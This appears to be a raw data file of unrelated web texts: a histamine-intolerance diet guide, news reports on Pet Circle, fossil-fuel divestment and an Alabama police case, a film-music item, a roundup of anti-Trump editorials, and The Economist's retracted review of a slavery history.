growing at 100 per cent a year, that's revenue, customers and staff. It's now a very different beast to what it was even 12 months ago. This is now heavy. I have a board, I have investors, I have directors and obligations.\" Pet Circle is now the third largest online pet business in the world and Frizell says there are lessons to be learnt from US based Chewy, which holds the number one spot and sold earlier this year for $US3.5 billion. Chewy has a team of 200 people full-time doing oil painting of pets and sends cards to all new customers and all customers whose pet has died.\n\nFrizell says he wants to incorporate some more elements of \"surprise and delight\" into Pet Circle's offering. \"We want to be number one in pet in Australia and New Zealand,\" he says. \"That probably implies not staying in ecommerce and not staying in Australia.\" The reporter was a guest of the Entrepreneurs Organisation.

  "latent_3796": "[Last updated 9th November, 2018]\n\nHistamine intolerance is poorly understood in the medical world.\n\nMost health professionals are not knowledgeable on the topic; diagnosis is flaky at best; and the condition itself is difficult to treat.\n\nThat’s why I’ve created this guide. It’s a comprehensive, research-driven review of histamine intolerance, with a particular emphasis on diet and treatment.\n\nWhat is histamine? A simple definition\n\nHistamine is a chemical that is both made by the body and found naturally in certain foods.\n\nIn the body it’s produced by mast cells (a type of white blood cell) and has a crucial role in our immune system. It’s actually the key mediator in causing the symptoms of allergy, which is why we take antihistamines for allergy relief.\n\nHistamine also occurs in our food as a by-product of the fermentation of Histidine, which is a form of protein. In this context it’s part of a family of chemicals known as Biogenic Amines, which are produced by bacteria during fermentation, storage or decay (1, 2).\n\nWhile high levels of biogenic amines (such as histamine) can make you feel unwell, the majority of people tolerate the amounts found in a regular diet.\n\nSummary: Histamine is a chemical that has a crucial role in our immune system. It’s produced by the body and also found in certain foods.\n\nWhat is histamine intolerance?\n\nApproximately 1% of the population experiences adverse reactions to what is considered a “normal” level of histamine in food (3).\n\nThis increased sensitivity is called a Histamine Intolerance.\n\nIt develops through both increased availability of histamine in the body, and decreased activity of the enzymes that break down histamine and remove it from your system. This “defect” is primarily thought to be caused by previous gastrointestinal disease and/or genetics.\n\nThe main histamine enzyme in the gut is Diamine Oxidase (DAO), while areas like the skin, spinal cord, lungs and other organs rely on an enzyme called Histamine N-Methyltransferase (HNMT) (3).\n\nSo, an individual with a histamine intolerance will have low levels of DAO or HNMT (or both), which can lead to a build-up of excess histamine in their blood plasma.\n\nIt’s not unlike those with a FODMAPs intolerance, or those intolerant to caffeine or lactose. These conditions are also the result of enzyme problems.\n\nWhat can cause high histamine levels?\n\nSome reasons why you may have lower levels of DAO and higher levels of histamine include:\n\nCertain medications that block DAO production, including several antibiotics\n\nGastrointestinal disorders like leaky gut syndrome and inflammatory bowel disease\n\nHigh histamine foods and foods that trigger histamine release (see list below)\n\nBacterial overgrowth, like that found in SIBO\n\nHistamine levels and testing\n\nNormal levels of plasma histamine range from 0.3–1.0 ng/mL, but anything above this causes problems.\n\nFor example, a level of 1–2 ng/mL can increase stomach acid secretion and heart rate, while levels of 3–5 ng/mL can cause flushing and headaches (4).\n\nA histamine-sensitive individual who consumes a high histamine meal is likely to get high plasma histamine levels. Unfortunately, there are no common tests to diagnose this, and the skin prick test is fairly new (5).\n\nTherefore, it’s important that an experienced clinician rules out food allergies before tweaking your diet for histamine intolerance.\n\nSummary: An increased sensitivity to histamine is called a histamine intolerance. It develops through both increased availability of histamine in the body, and decreased activity of the DAO enzymes that break it down. This can be caused by certain medications, gastrointestinal disorders and/or high-histamine foods. There are no common tests to diagnose this condition.\n\nSigns and symptoms of histamine intolerance\n\nWhile symptoms appear allergy-like, they do not involve an IgE-mediated response and therefore are not allergic reactions (hence the term intolerance).\n\nOf course, there is no way to know this until you have ruled out allergy through tests.\n\nThe onset and severity of histamine intolerance symptoms vary greatly between individuals, but common complaints are:\n\nFlushing and headaches\n\nRespiratory problems including asthma, runny or blocked nose\n\nSkin conditions likes rashes, dermatitis, hives or eczema\n\nGastro problems such as nausea, reflux, vomiting, abdominal pain, diarrhea\n\nDizziness, low blood pressure and irregular heartbeat\n\nAlso note that antihistamines may help to relieve symptoms, but only if you do not already follow a low-histamine diet (3).\n\nSummary: Symptoms appear allergy-like, but they do not involve IgE antibodies. The only way to be sure is to get tested for allergies.\n\nHigh-histamine foods to limit or avoid\n\nIf you are histamine intolerant, it makes sense to reduce the amount of histamine you consume.\n\nUnfortunately, it’s difficult to quantify the amount of histamine found in different foods. It varies greatly according to the type of bacteria, food composition, length of time unrefrigerated and conditions for fermentation (6).\n\nAs a general rule, high concentrations of histamine are typically found in fermented foods such as bread (effects of yeast), sauerkraut, wine, beer, processed meat and aged cheese.\n\nIn addition to histamine-rich food, there is an untested theory that several foods have the capacity to release histamine directly from our white blood cells (7).\n\nThis means they could contribute to increased histamine levels, even if that food itself is low histamine.\n\nHigh histamine foods\n\nThere is a lot of conflicting information online and I found many authoritative sites did not provide very comprehensive lists.\n\nHere, I’ve summed up the foods that most experts recommend you avoid:\n\nFermented dairy products such as aged cheese, yogurt and quark\n\nFermented or pickled vegetables\n\nSoured foods such as sour cream and buttermilk\n\nTinned/canned, cured and processed meats\n\nFermented soy products including miso, tempeh and soy sauce\n\nGreen tea, matcha tea, coffee, cocoa, chocolate\n\nAll legumes (including peanuts) and tree nuts (regular nuts)\n\nCitrus fruits, raspberries, strawberries, bananas, pineapple, grapes, pears and fruit juice\n\nAvocado, eggplant, spinach, olives, tomato and tomato products (ketchup, tomato juice)\n\nVinegar, bouillon and broth\n\nSmoked fish\n\nAny alcohol\n\nJunk foods or drinks that contain artificial colours or flavors.\n\nI strongly recommend you also check out this Histamine Compatibility list (PDF) by the Swiss Interest Group Histamine Intolerance (SIGHI).\n\nIt ranks the likelihood of foods to cause symptoms on a scale of 0 to 3 as well as other important tips.\n\nSummary: Foods to look out for are either high in histamine or have the capacity to release histamine from our white blood cells. As a general rule, fermented foods are the most histamine-rich and should be avoided.\n\nHow much histamine is safe for those who are sensitive?\n\nDefining a safe threshold level for those with a histamine intolerance is incredibly difficult (8).\n\nFirstly, sensitivity to bioactive amines varies greatly between individuals. Unlike food allergies, which are triggered at first exposure, it’s the cumulative amount of histamine that causes symptoms. What may trigger headaches in one person may have no effect on the other.\n\nSecondly, as mentioned above, certain pharmaceutical drugs inhibit the enzyme DAO from breaking down histamine in the body. This can lead to increased histamine levels over time, especially if they are long-term medications (9).\n\nSome of the more common drugs include alprenolol (for blood pressure) and many forms of antibiotics.\n\nThese factors must be accounted for when deciding on individualized dietary changes and how strict they should be.\n\nAs a general guideline, a limit of 100 mg histamine per kg in foods and of 2 mg histamine per liter in alcoholic beverages has been suggested, although these are likely too generous (10).\n\nSummary: Individual sensitivity to histamine, as well as the impact of certain pharmaceutical drugs can seriously affect plasma histamine levels. Therefore, defining a safe threshold is very difficult.\n\nA low-histamine diet\n\nA low-histamine diet is a structured program that’s best done under the supervision of a dietitian specializing in food intolerance.\n\nOnce food allergy has been ruled out, the elimination phase involves strictly limiting the amount of histamine you consume for 2-4 weeks. Diet and symptoms must be recorded in your own food diary, which is proven useful in tracking significant improvements and relapses.\n\nThe reintroduction phase is next, where you gradually reintroduce histamine-containing foods to determine your tolerance and threshold. It doesn’t need to be done in a particular order, and I generally advise that you reintroduce the foods you miss the most first.\n\nSome pointers to keep in mind:\n\nTry to cook most of your own meals during the elimination phase\n\nAvoid or limit eating canned foods and ready meals\n\nAvoid junk foods; food dyes/artificial colors can be major triggers\n\nKeep your kitchen clean\n\nRefrigerate vigilantly as histamine forms on food as it spoils.\n\nA low-histamine diet plan\n\nHere’s an idea of what a realistic low-histamine day would look like:\n\nBreakfast: Cereal + milk\n\nLunch: Fresh Spring (Rice-Paper) Rolls. Avoid using meat or veggies on the high-histamine list.\n\nDinner: Pan-seared chicken breast (fresh or thawed rapidly) + roast potato and vegetables (not those on high histamine list)\n\nSnacks: 1 apple or peach; cucumber or carrot sticks + cottage cheese\n\nDrinks: Water, herbal tea\n\nSummary: A low-histamine diet requires you to follow a 2-4 week elimination period, followed by a reintroduction phase to determine your histamine threshold. A diet and symptom diary is necessary, and it’s strongly recommended that you see a specialist dietitian during this entire plan.\n\nImportant considerations before you trial a low-histamine diet\n\nSignificant dietary restrictions can affect nutritional status at any age (11).\n\nTherefore, the risk–benefit ratio must be considered first when contemplating any form of elimination diet. Much like a low FODMAP diet, a low-histamine diet excludes multiple nutrient-dense foods that provide health benefits.\n\nThis is why it’s recommended that you follow a low-histamine diet under the supervision of a dietitian specialized in food intolerance.\n\nNot appropriate for young children\n\nLow chemical diets are becoming increasingly popular for young children despite the lack of evidence that they help.\n\nA 2013 case-study review of 74 children placed on an elimination diet (for salicylates) found that almost half experienced harmful side-effects, including nutritional deficiencies, food aversion and eating disorders (12).\n\nGrowth rate is highest within the first years of life and a failure to meet this potential can have a long-lasting impact on development and later health (13).\n\nTherefore, chemical elimination diets are only warranted for young children if there is clear-cut evidence it’s helping with symptoms.\n\nSummary: A low-histamine diet can be quite restrictive even though it’s temporary, so consider your nutrition status before you start. It’s not appropriate for young children.\n\nSupplements for histamine intolerance\n\nThere is basically one supplement available marketed specifically for histamine intolerance.\n\nIt contains DAO isolated from pig kidneys and is designed to supplement the sub-optimal DAO levels of patients with histamine intolerance.\n\nThere was one clinical trial that found DAO supplementation helped to reduce the duration of histamine-induced migraines by 30%, but not the intensity nor how often they occur (14). It was reportedly a small study though, and ideally it would be nice to see if the results can be replicated.\n\nThe reviews of this particular supplement are interesting, and you can give it a try. Note that the capsules are labelled vegetarian (as you would expect), but the DAO inside is sourced from pork. Highly misleading labelling.\n\nAnd as always, please consult with your personal doctor before you decide to try any new supplements.\n\nVitamin C and vitamin B6\n\nSome researchers believe both vitamin C and vitamin B6 supplementation can be beneficial.\n\nBoth nutrients are required (cofactors) for DAO activity, so in theory they act as antihistamines by supporting the breakdown of histamine (15, 16).\n\nOne trial found that 5 mg of vitamin B6 supplementation daily significantly increased DAO activity in pregnant teenagers, but only those deficient in vitamin B6. It didn’t benefit anyone else (17).\n\nThat’s the only scientific proof I could find, and study after study shows that vitamin supplements are basically useless unless you have a clinical deficiency. Your money is better spent on foods naturally rich in vitamin B6 and vitamin C.\n\nNote that if you want to try vitamin C supplements, it’s best to avoid the form called ascorbic acid. It’s typically derived from fermented corn and/or citrus, both not appropriate for histamine intolerance.\n\nSummary: DAO supplementation was shown in one clinical trial to reduce the duration of migraines, but had no effect on frequency or severity of symptoms. In theory, a vitamin C and/or vitamin B6 supplement may help too, but this is not supported by any strong evidence.\n\nProbiotics for histamine intolerance\n\nProbiotics are microscopic bacteria that we get from fermented foods.\n\nThey help to restore and maintain the balance of bacteria in the gut, which is linked to varying aspects of well-being including digestive health and even weight loss.\n\nFermented foods are not an option for someone with a histamine intolerance, which leaves us with probiotic supplementation. Unfortunately the research is thin.\n\nOne study found oral intake of two Bifidobacterium strains supressed factors involved in histamine signalling and production, at least in rats (18).\n\nAnother study looked at the effects of several probiotic strains on human mast cells in a laboratory setting. Researchers were able to “turn down the dial” on the immune response and minimize histamine release, especially with two strains of Lactobacillus rhamnosus (19).\n\nIt seems that if probiotics were to help, they would be most useful in preventing allergic reactions rather than treating symptoms of histamine intolerance. Nevertheless, if you want to try some just be careful about what strains you use. Some strains of Lactobacillus have been shown to increase histamine content, while other strains decrease it (20, 21).\n\nI suggest this probiotic (Lactobacillus rhamnosus) or this probiotic (Bifidobacterium strains) (full disclosure: these are Amazon affiliate links).\n\nJust note that we don’t know the optimal dosage for this condition, nor the long-term side effects (if any), so always consult with your doctor first.\n\nSummary: Early studies on rodents and in test-tubes have shown that certain probiotic strains may help minimize histamine release. The most effective strains are likely to be Lactobacillus rhamnosus or several Bifidobacterium strains, but there is no guarantee they will help.\n\nThis is only a guide…\n\nThere are a lot of aspects to consider when treating histamine intolerance, particularly when it comes to diet and nutrition.\n\nWhile I’m a qualified dietitian, this general advice is no substitute for your personal medical professional that knows your medical history.\n\nThat being said, if food allergy has been ruled out, avoiding histamine-rich foods as part of a low-histamine diet is the next logical step. Some supplements and probiotics may help, but I would not expect any miracles.\n\nThere’s also the possibility of a food intolerance, which you can learn more about here.",
  "latent_3832": "By Taylor Kuykendall\n\nA new coalition of U.S. and international foundations is calling on other organizations to join in its divestment from fossil fuel companies in favor of investments in the \"clean energy economy.\"\n\nDivest-Invest Philanthropy is a coalition of 17 foundations with an asset base of nearly $2 billion. The coalition says there are both financial and ethical risks in remaining invested in fossil fuels in the face of available science on climate change and the effects of fossil fuels on the planet and the economy.\n\nEllen Dorsey, executive director of the Wallace Global Fund, started the effort. As of Jan. 30, the fund will pledge to use all of its assets to advance its goals, values and beliefs, she said.\n\n\"A prudent fiduciary would look at the long-term viability of fossil fuels investments and act now,\" Dorsey said on a Jan. 30 conference call with several of the participating foundations. \"We feel confident of comparable or superior returns for our endowment portfolios without fossil fuels. This confidence is not magical thinking, but rather rooted in number-crunching financial analysis and our own real-world experiences.\"\n\nDorsey said the Wallace Fund has already substantially divested from fossil fuels, and the performance of its overall portfolio has been \"excellent.\"\n\nTom Van Dyck, investment consultant to signatories Education Foundation of America and the Park Foundation, said fossil fuel companies already hold enough fossil fuel reserves that, if burned, could push the global climate to catastrophe. He said that with the continuing push for action on climate, there is a heavy risk that those reserves and other capital investment will become stranded.\n\n\"It's not just about values,\" he said. \"It's about valuation. It's about the risk that you are taking as a shareholder holding these companies.\"\n\nOlivia Farr, board chair of the John Merck Fund, said her organization believes it needs to respond to climate change with every asset available.\n\n\"If we don't, we won't have a livable planet to do our work and fulfill our mission,\" Farr said. \"It's that simple.\"\n\nFarr said the John Merck Fund, now 97% divested from fossil fuels, became interested in divestment when it realized it was funding efforts to alleviate the effects of climate change while simultaneously holding investments in fossil fuel companies. She said investing all its assets, not just a sliver of grant funds, toward foundation goals such as clean energy is the best method to accomplish its mission.\n\n\"We can't rely only on federal and state policies to create change,\" Farr said. \"We need to move faster than that. We need to move markets to make progress on climate change and our own program goals. So, voting with our dollars in the marketplace has become an increasingly useful tool.\"\n\nRichard Woo, chief executive officer of the Russell Family Foundation, said climate change affects all foundations on the planet, regardless of mission. By extension, he said, fossil fuel interests are undercutting the mission of all foundations.\n\nOther foundations interested in divestment, Woo said, should not feel intimidated by the seemingly complex process of divesting from fossil fuels. \"If you take it in incremental steps and you focus on progress and not perfection, at least to begin with, you can make real advances,\" Woo said.\n\nThe movement toward divestment from fossil fuels, the coalition noted, began on college campuses two years ago and has since spread to cities, states, pension funds and religious institutions. Divest-Invest said in a news release that more than 50 institutions in the United States alone, including nearly two dozen cities, have committed to divest.\n\nA study by the Smith School of Enterprise and Environment at the University of Oxford found that the coal industry is particularly susceptible to threats of investor divestment in fossil fuels.\n\nOther signatories to the Divest-Invest Philanthropy include Ben & Jerry's Foundation, the Chorus Foundation, Compton Foundation, the Educational Foundation of America, Granary Foundation, Jesse Smith Noyes Foundation, Joseph Rowntree Charitable Trust, KL Felicitas Foundation, Nia Community Fund, Schmidt Family Foundation, the Sierra Club Foundation, Singing Field Foundation and the Solidago Foundation.",
  "latent_3842": "The composer who worked on two recent Best Picture winners is taking a monstrous leap. Alexandre Desplat, the composer of scores for The King’s Speech and Argo, as well as for Moonrise Kingdom and both Harry Potter and the Deathly Hallows among others, will be writing the music for next year’s big budget remake of Godzilla.\n\nFilm School Reporter (via First Showing) revealed the news. In an interview the composer did with First Showing to promote The Tree of Life, he said the following about his career trajectory:\n\nI just try to keep myself in a very agitated musical world. But the key is not to do twice in a row the same kind of film. And if you look at my filmography, I never do twice… It’s rare that in a year I would do several romantic comedies or several thrillers or several action movies, which I don’t do much anyway.\n\nThe fact that he’s making an exception to that for Godzilla either says loads about Edwards’ film or, more likely, a love of old school monster movies.

  "latent_3858": "Donald Trump is being bombarded by another round of scathing editorials from across the country, this time questioning his judgement and fitness to serve which has now put our national security at risk. Below is a sampling of editorials that Americans across the country are reading today:\n\nThe New York Times Editorial: Can Donald Trump Be Trusted With State Secrets?\n\n“Mr. Trump created this latest crisis during an immature boast about himself. “I get great intel. I have people brief me on great intel every day,” he is reported to have said, before telling Sergey Lavrov, the Russian foreign minister, and Sergey Kislyak, the Russian ambassador to the United States, about his knowledge of an ISIS plot. After his Russian guests left the Oval Office, White House officials struggled to limit the damage by contacting the Central Intelligence Agency and the National Security Agency and trying to scrub transcripts from the meeting. The news media has withheld the most sensitive details of what Mr. Trump told the Russians. Lt. Gen. H. R. McMaster, the national security adviser, mounted an odd and hairsplitting defense, saying that Mr. Trump’s disclosure was “wholly appropriate” while acknowledging that Mr. Trump didn’t know the source of the information and had blurted it out at the spur of the moment.”\n\nWall Street Journal Editorial: Loose lips sink presidencies\n\n“The portrait of an inexperienced, impulsive chief who might spill secrets to an overseas foe is one to which Mr. Trump has too often contributed. It was political mismanagement even to hold the Russian meeting, especially the day after he fired FBI Director James Comey amid the investigation of the Trump campaign’s alleged Russian connection. This eruption shows why a President’s credibility is so important. If people don’t believe Mr. Trump’s words or trust his judgment, they won’t give him the benefit of the doubt or be responsive if he asks for support. Last week the White House spent two days attributing Mr. Comey’s firing to a Justice Department recommendation, only for Mr. Trump to insist in a TV interview that the pink slip came ‘regardless of recommendation.'”\n\nWashington Post Editorial: Trump can’t be trusted with sensitive information — and now the world knows\n\n“The consequences of the president’s lapse could be far-reaching. In addition to disrupting a vital flow of intelligence and possibly endangering agents on the ground, Mr. Trump has let the world know that he and his administration cannot be trusted with sensitive information. Governments that share their secrets with the CIA, from Britain to Israel to Australia, may feel compelled to recalibrate their cooperation. Those that don’t have a cooperative relationship, such as Russia and China, will try to use their access to Mr. Trump to extract more indiscretions. The administration’s attempts to defend the leak only underlined the continuing chaos in the White House.”\n\nSt. Louis Post-Dispatch Editorial: Amateur hour at the White House\n\n“The Russians have found a true friend in the Oval Office. Someone who would blithely share some of the most sensitive intelligence in America’s possession regarding Islamic State terrorist plots. Someone who won’t allow American journalists to cover a meeting with top Russian diplomats but who would grant Russia’s government news agency exclusive coverage. Donald Trump was willing to share top secret information not just to Russia’s foreign minister but to an ambassador, Sergey Kislyak, believed by the United States to have links to Russian spies. That’s what true friends do.”\n\nSacramento Bee Editorial: Trump’s loose lips raise basic question: What’s the GOP’s tipping point?\n\n“When does President Donald Trump’s inexperience and incompetence become a clear and present danger to America’s national security? That fraught question has to be asked after what may be the most alarming episode yet. As first reported by The Washington Post, Trump shared highly classified information with top Russian officials about a threat by the Islamic State to use laptop computers to blow up civilian airliners – details we hadn’t even told our allies. So now a dangerous terrorist group knows it has a spy in its highest circles. Allies may not be so willing to share intelligence. The New York Times reported that the information in question came from Israel, a crucial U.S. partner in the Middle East that Trump will visit Monday on his first foreign trip as president.”\n\nThe Modesto Bee Editorial: Trump’s brags are dangerous to America\n\n“Trump is a braggart, pure and simple. He brags (and exaggerates) about his electoral victory. He brags (and exaggerates) about his popularity. He brags (and exaggerates) about his business acumen, the elegance of his properties and his sexual conquests. Of course he was bragging to two top Russian officials last week. It’s what he does. Spies and moles hide their nefarious deeds; braggarts broadcast their prowess to the world. Trump’s skills are those of a front man; a salesman trying to instill confidence in a client. But Russia is not a client or a partner. By bragging in a setting from which American media was barred but Russian media was welcomed, Trump proved himself incredibly reckless and entirely unreliable. In this case, he was a detriment to the conduct of our nation’s foreign policy and the world’s security.”\n\nKansas City Star Editorial: Giving Trump a chance is harder every day\n\n“There is little that’s conservative about this president, and we ask: Much as you love how crazy he drives not just liberals, but the entirety of the conservative intelligentsia, is making all the right people angry really enough to justify support for the reckless way he’s risked our national security by revealing highly classified information about the Islamic State to the Russians, in an Oval Office meeting covered only by TASS?”\n\nMinneapolis Star Tribune Editorial: Trump White House enters a new state of denial\n\n“The meeting itself was an oddity. The U.S. has imposed sanctions against Russia for its illegal invasion of Ukraine and forced annexation of Crimea. American intelligence agencies are uniform in their conclusion that Russians hacked the U.S. election. The list of Russian aggression is long and growing. Trump’s response? Invite the Russians into the Oval Office, grinning and shaking hands and offering up choice bits of intel. If that’s not chilling enough, there is the distinct possibility the Russians may have a complete transcript of what Trump said, since their state-owned news agency, Tass, was allowed to remain in the room when U.S. news media was barred.”\n\nNews-Times Editorial: Trump will spill the beans sooner or later\n\n“Trump: Yeah, sure I was thinking about the Russia investigation. I’ve been thinking of firing Comey since the beginning. He’s a disaster. Trump can’t help himself. Lies seem to bore him, even when told in his defense. They’re too much trouble. And, besides, he’s always gotten his way by speaking his and everyone else’s mind. His impulse to share his unfiltered thoughts is precisely what makes him both entertaining and a terrible president.”\n\nSanta Rosa Press-Democrat Editorial: Is Trump’s mouth becoming his and the nation’s worst enemy?\n\n“We don’t know whether Trump truly disclosed highly sensitive information in a moment of intemperate candor with the Russians. But given the president’s performance to date, it certainly rings true. And for the nation as a whole, that ringing should sound like an alarm. The president’s poor judgment and lack of self-control is putting people at risk.”\n\nVirginian-Pilot Editorial: What nation will trust us with a president who offers no stability or restraint?\n\n“Trump’s actions are well outside the bounds of propriety when it comes to the handling of classified information. Indeed, they represent the type of thoughtless, haphazard chaos that has come to define this White House and its operations. By all accounts, Trump didn’t speak to any intelligence officials before revealing the information to the Russians, and The Post reported that a White House aide made hurried calls to the Central Intelligence Agency and the National Security Agency shortly after the meeting adjourned. Nor did the president clear his decision with the foreign ally, potentially compromising that intelligence-sharing relationship and harming the United States’ fight to defeat the Islamic State. It could even threaten the lives of assets in Syria who are trying to obtain valuable intelligence on this nation’s behalf. These are not small matters. They in fact have enormous, wide-reaching implications.”\n\nConcord Monitor Editorial: When will the minions wake up?\n\n“President Donald Trump revealed highly classified information to Russian officials last week, the Washington Post reported on Monday. His decision wasn’t illegal – the president can declassify anything he wants – but it was reckless. The information about the Islamic State was reportedly provided by Israel and was so sensitive that it wasn’t even passed on to American allies, which Russia certainly isn’t, or widely circulated within the U.S. government. Trump’s latest stumble has jeopardized intelligence cooperation not only with Israel and other partners in the Middle East but with all of the nation’s allies. At least one European intelligence official told the Associated Press on Tuesday that his country might stop sharing intelligence information with the U.S.”\n\nStar-Ledger Editorial: The national security threat is a child Donald Trump\n\n“That inability to anticipate how he will be perceived, or what others might say or do, is exactly why Trump cannot be trusted with classified intelligence in the first place. It’s why his communications staff is so desperate to take his phone away. In this case, though, his incompetence won’t just cost jobs or reputations, or what little might remain of White House credibility. It could actually cost lives.”\n\nBaltimore Sun Editorial: Trump’s loose lips\n\n“And it would be truly laughable, except that sharing classified information is rather a serious business, particularly if it compromises our relationship with another country that provided the secrets — apparently related to the potential terrorist threat posed by laptops taken on commercial flights — exposing that country to blowback or even putting operatives in peril. Oh, and let’s not forget that the first instinct of the Trump White House was to prevaricate and deny that “intelligence sources or methods” or “military operations” were discussed as National Security adviser H.R. McMaster did to reporters when the Post’s article claimed nothing of the kind.”\n\nDenver Post Editorial: Someone should tell President Trump: Loose lips sink ships\n\n“For a man who wanted to lock up Hillary Clinton for her reckless handling of State Department materials, President Donald Trump seems remarkably unaware of the dangers of leaking highly classified information to known adversaries. Given that the president frequently blames his bad luck on staffers talking to reporters without permission, who can blame anyone for marveling at Trump’s leaking — to the Russians — information so classified that just mentioning it risks outing a key ally in our fight against the Islamic State? It’s as if the president of the United States of America doesn’t remember classic national security wisdom: “Loose lips sink ships.”\n\nYork Dispatch Editorial: An American tragedy\n\n“New damning revelations are coming daily, sometimes hourly. The latest example is the allegation that Trump shared classified secrets about Islamic State militants to Russian officials last week during a closed-door meeting, jeopardizing the source of the intelligence and betraying the ally that shared it with U.S. intelligence. The information was “considered so sensitive that details have been withheld from allies and tightly restricted even within the U.S. government,” according to The Washington Post, which broke the story Tuesday. Where is the outrage among Republicans? Where is the full-throated demand for answers? Except for a few, most Republicans are either silent or embarrassingly timid.”\n\nLos Angeles Times Editorial: Trump can share all the intel he wants. That doesn’t mean it’s not bone-headed and hypocritical\n\n“There’s also reason to be concerned that the president is not doing the work necessary to understand the complicated subjects that face him. Perhaps he blurted out sensitive national security secrets to the Russian ambassador because he honestly didn’t know any better — because he’s not doing his homework. Since Trump took office, there have been repeated stories suggesting that he is unwilling to read long, complicated briefing papers and that he wants his information short, simple and on a single page. Maybe that approach works in reality television or in the hotel business, but it’s not what most Americans expect of a president of the United States.”\n\nCharlotte Observer Editorial: Is Donald Trump dangerous enough yet, Republicans?",

  "latent_4196": "Alabama Attorney General Luther Strange no longer wishes to pursue a criminal case against Madison police officer Eric Parker.\n\n\"After a careful review of the witness testimony included in 2,000 pages of federal trial transcripts and a re-evaluation of the evidence, we are seeking to dismiss State charges against Mr. Parker,\" said Strange in a press release late this afternoon.\n\nParker swept into international news in February of 2015 with the takedown and injury of an unarmed Indian citizen, 57-year-old Sureshbahi Patel, out for a walk in front of his son's home in Madison.\n\nThe stop left Patel partly paralyzed and in need of spinal surgery. Madison Police Chief Larry Muncey six days later recommended that Parker be fired. Madison police arrested Parker on Feb. 12 for misdemeanor assault.\n\nAs the news and the video traveled the globe, Gov. Robert Bentley wrote a letter apologizing to the Patel family and the Indian government for the use of excessive force by Parker.\n\nMadison Police Officer Eric Parker leaving the federal courthouse in Huntsville, Ala., on Oct. 29, 2015 (Bob Gathany/bgathany@AL.com)\n\nBut the U.S. government later intervened and leveled a more serious civil rights charge against Parker. The three-man team of federal prosecutors twice attempted to prove that Parker acted willfully in using excessive force against Patel.\n\nProsecutors argued that Parker knew the leg sweep and facefirst slam of a small older man would lead to injury, but Parker testified he did not intentionally use a leg sweep and that he lost his balance and fell awkwardly during the takedown.\n\nTwice a jury failed to reach agreement. After back-to-back mistrials, U.S. District Judge Madeline Hughes Haikala in January granted a motion to acquit, saying there would not be a third federal trial.\n\nWith the federal case concluded, Parker had been scheduled to face a bench trial in district court in Limestone County starting on June 7. That was for the original misdemeanor assault charge, which carries up to a year in jail.\n\nThe case had been assigned to Assistant Alabama Attorney General Bill Lisenby Jr.\n\nStrange today filed a motion to dismiss the misdemeanor charge.\n\nChirag Patel helps his father, Sureshbhai Patel, as they arrive outside the federal courthouse before start of the first trial against Eric Parker on Sept. 1, 2015, in Huntsville, Ala.

Hindsight brings clarity to a calamity...,\" wrote Strange.\n\n\"While the State charge has a lesser kind of culpability than that of the federal charge,\" he wrote, \"the evidence is the same and the State's burden remains proving its case beyond a reasonable doubt.\"\n\n\"After a review of the federal trial testimony, it does not appear that there would be sufficient evidence to prove the case beyond a reasonable doubt. Thus, we have a duty to move to dismiss the charge.\"\n\nDistrict Judge Doug Patterson in Limestone County approved the request to drop the charge.\n\n\"The State of Alabama having filed a motion to dismiss this action and the Court having considered the same it is hereby ordered, adjudged and decreed that this case is dismissed,\" reads the ruling filed at 4:48 p.m. today.\n\nPatel's attorney, Hank Sherrod, in February of 2015 filed a federal civil suit against Parker and Madison. That has been on hold pending the resolution of the criminal charges.\n\nMadison police Chief Larry Muncey leaves federal court on April 15, 2016, followed by his attorney, Jerry Barclay. (Paul Gattis/pgattis@al.com)\n\nMeanwhile, the only person to be found guilty of a crime in the case is Madison Police Chief Larry Muncey who contended that Parker had no cause to stop or take down Patel.\n\nHe recommended that Parker be fired, but Judge Haikala found that Muncey communicated with witnesses during the first trial.\n\nMuncey sent emails demanding to know why some of his officers who were called as witnesses had testified that the takedown was within policy. Muncey, who said he had a duty as chief to correct his officers, was found guilty last month of criminal contempt of court and fined $2,500.\n\nMuncey is on administrative leave while he appeals the contempt ruling.

  "latent_4337": "Apology: In our review of “The Half Has Never Been Told: Slavery and the Making of American Capitalism” by Edward Baptist, we said: “Mr Baptist has not written an objective history of slavery. Almost all the blacks in his book are victims, almost all the whites villains.” There has been widespread criticism of this, and rightly so. Slavery was an evil system, in which the great majority of victims were blacks, and the great majority of whites involved in slavery were willing participants and beneficiaries of that evil. We regret having published this and apologise for having done so. We have therefore withdrawn the review, but in the interests of transparency the text remains available only on this special page and appears below.\n\n“FOR sale: a coloured girl, of very superior qualifications…a bright mulatto, fine figure, straight, black hair, and very black eyes; very neat and cleanly in her dress and person.” Such accounts of people being marketed like livestock punctuate Edward Baptist’s grim history of the business of slavery.\n\nAlthough the import of African slaves into the United States was stopped in 1807, the country’s internal slave trade continued to prosper and expand for a long time afterwards. Right up until the outbreak of the civil war in 1861, the American-born children and grandchildren of enslaved Africans were bought cheap in Virginia and Maryland to be sold dear in private deals and public auctions to cotton planters in the deep South.\n\nTall men commanded higher prices than short ones. Women went for less than men. The best bids were for men aged 18 to 25 and for women aged 15 to 22. One slave recalled buyers passing up and down the lines at a Virginia slave auction, asking, “What can you do? Are you a good cook? Seamstress? Dairy maid?” and to the men, “Can you plough? Are you a blacksmith?” Slaves who gave surly answers risked a whipping from their masters.\n\nRaw cotton was America’s most valuable export. It was grown and picked by black slaves. So Mr Baptist, an historian at Cornell University, is not being especially contentious when he says that America owed much of its early growth to the foreign exchange, cheaper raw materials and expanding markets provided by a slave-produced commodity. But he overstates his case when he dismisses “the traditional explanations” for America’s success: its individualistic culture, Puritanism, the lure of open land and high wages, Yankee ingenuity and government policies.\n\nTake, for example, the astonishing increases he cites in both cotton productivity and cotton production. In 1860 a typical slave picked at least three times as much cotton a day as in 1800. In the 1850s cotton production in the southern states doubled to 4m bales and satisfied two-thirds of world consumption. By 1860 the four wealthiest states in the United States, ranked in terms of wealth per white person, were all southern: South Carolina, Mississippi, Louisiana and Georgia.\n\nMr Baptist cites the testimony of a few slaves to support his view that these rises in productivity were achieved by pickers being driven to work ever harder by a system of “calibrated pain”. The complication here was noted by Hugh Thomas in 1997 in his definitive history, “The Slave Trade”; an historian cannot know whether these few spokesmen adequately speak for all.\n\nAnother unexamined factor may also have contributed to rises in productivity. Slaves were valuable property, and much harder and, thanks to the decline in supply from Africa, costlier to replace than, say, the Irish peasants that the iron-masters imported into south Wales in the 19th century. Slave owners surely had a vested interest in keeping their “hands” ever fitter and stronger to pick more cotton. Some of the rise in productivity could have come from better treatment. Unlike Mr Thomas, Mr Baptist has not written an objective history of slavery. Almost all the blacks in his book are victims, almost all the whites villains. This is not history; it is advocacy.",
